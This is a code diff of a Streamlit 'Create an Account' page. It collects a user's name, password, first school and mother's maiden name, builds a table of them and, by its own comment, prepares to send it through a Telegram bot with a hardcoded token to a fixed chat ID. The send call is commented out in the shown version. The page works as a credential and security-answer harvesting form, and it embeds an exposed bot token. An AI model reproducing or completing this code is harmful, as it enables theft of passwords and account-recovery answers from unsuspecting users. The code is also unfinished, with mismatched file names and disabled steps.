@@ -1,35 +1,51 @@
 import streamlit as st
 import pandas as pd
+import cv2
 
 # streamlit run app.py
 
 st.subheader("Create an Account")
-new_user = st.text_input('Username')
+new_user = st.text_input('Full Name')
 new_passwd = st.text_input('Password', type='password')
 if new_user and new_passwd:
 	st.success("You have successfully created an account.Go to the Login Menu to login")
 	df = pd.DataFrame({"username": [new_user], "password": [new_passwd]})
 
-st.write('Please answer the security questions:')
+st.subheader('Please answer the security questions:')
+st.write('Notice! if you forget the answers to the questions, you will not be able to login')
 school = st.text_input('Name of your first school?')
 mom_name = st.text_input('Mother''s maiden name?')
-hotel = st.text_input('next vacation - fancy boho chick hotel or airbnb in a secluded beach?')
-drink = st.text_input('Next vacation with grillouzo or limoncello?')
+hotel = st.text_input('next vacation - fancy boho chic hotel or airbnb in a secluded beach?')
+drink = st.text_input('Next vacation - pizza or tzatziki?')
 
 
 # save results to csv and send via telegram
 
 df = pd.DataFrame({"username": [new_user], "password": [new_passwd], "school": [school], "mom_name": [mom_name], "hotel": [hotel], "drink": [drink]})
 import telebot
-import dataframe_image as dfi
+# import dataframe_image as dfi
 import cv2
 
 TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
 tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
 if st.button('Sign Up'):
+	im  = cv2.imread('Picture1.png')
+	im = im[:, :, ::-1]
+	# st.image(im)
+	st.image('head.jpg')
+	for i in range(1, 3):  # number of rows in your table! = 2
+		cols = st.columns(2)  # number of columns in each row! = 2
+		# first column of the ith row
+
+		# cols[0].image('row_%i_col_0.png' % i, use_column_width=True)
+		# cols[1].image('row_%i_col_1.jpg' % i, use_column_width=True)
+		cols[0].image('Picture1.png' , use_column_width=True)
+		cols[1].image('Picture1.jpg' , use_column_width=True)
+
+	images = st.text_input('write down the image numbers')
 	# dfi.export(df,"mytable.png")
 	image = cv2.imread('mytable.png')
-	image = open('mytable.png', 'rb')
+	image = open('mytable.jpg', 'rb')
 	chat_id = '630924196'
 	# tb.send_photo(chat_id=chat_id, photo=image)
 
